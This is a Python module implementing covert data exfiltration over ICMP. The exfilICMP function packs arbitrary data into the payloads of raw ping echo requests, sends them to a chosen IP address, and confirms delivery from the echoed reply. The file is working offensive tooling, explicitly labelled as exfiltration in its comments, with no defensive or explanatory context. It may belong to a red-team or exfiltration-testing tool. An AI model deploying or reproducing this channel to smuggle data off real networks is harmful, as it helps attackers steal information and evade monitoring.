import time
from ping3 import checksum
import os
import socket
import struct
import logging

# generate ICMP request
def genPacket(data):
    logging.debug("Generating ICMP packet")
    if isinstance(data, list):
        data = ','.join(data)

    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = os.getpid() & 0xFFFF
    icmp_seq = 1

    icmp_packet = struct.pack("BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    icmp_packet += bytes(data, "utf-8")

    icmp_checksum = checksum(icmp_packet)
    icmp_packet = struct.pack("BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    icmp_packet += bytes(data, "utf-8")

    logging.debug("ICMP packet generated")
    return icmp_packet

# receive ICMP echo reply
def recv_reply(sock, msg):
    logging.debug("Receiving ICMP reply")
    if isinstance(msg, list):
        logging.debug("data is a list, converting to string")
        msg = ','.join(msg)

    while True:
        data, addr = sock.recvfrom(4096)
        icmp_header = data[20:26]
        icmp_type, _, _, _ = struct.unpack("BBHH", icmp_header)
        logging.debug(f'ICMP Connection from {addr}')

        if icmp_type == 0:
            recv_msg = data[28:].decode("utf-8")
            if recv_msg == msg:
                logging.debug(f'ICMP Connection from {addr} received data')
                return {
                    "good": True,
                    "recv": recv_msg
                }
            else:
                logging.debug(f'ICMP Connection from {addr} got bad or no data')
                return {
                    "good": False,
                    "recv": recv_msg
                }

# exfil data over ICMP ping
def exfilICMP(ip, msg):
    logging.debug("Using ICMP exfiltration")
    if isinstance(msg, list):
        logging.debug("data is a list, converting to string")
        msg = ','.join(msg)

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as client_socket:
        logging.debug("ICMP socket created")
        client_socket.settimeout(5)

        echo_request = genPacket(msg)
        client_socket.sendto(echo_request, (ip, 1))
        logging.debug(f'ICMP Connection sent echo_request to {ip}')

        time.sleep(1) # we need to wait for each individual reply

        try:
            echo_reply = recv_reply(client_socket, msg)
            logging.debug(f'ICMP Connection received echo_reply from {ip}. returning.')
            return {
                "good": echo_reply["good"],
                "recv": echo_reply["recv"],
                "err": None
            }
        except Exception as e:
            logging.error(f"Failed to receive reply from ICMP server: {e}")
            return {
                "good": False,
                "recv": None,
                "err": f"Failed to receive reply from ICMP server: {e}"
            }
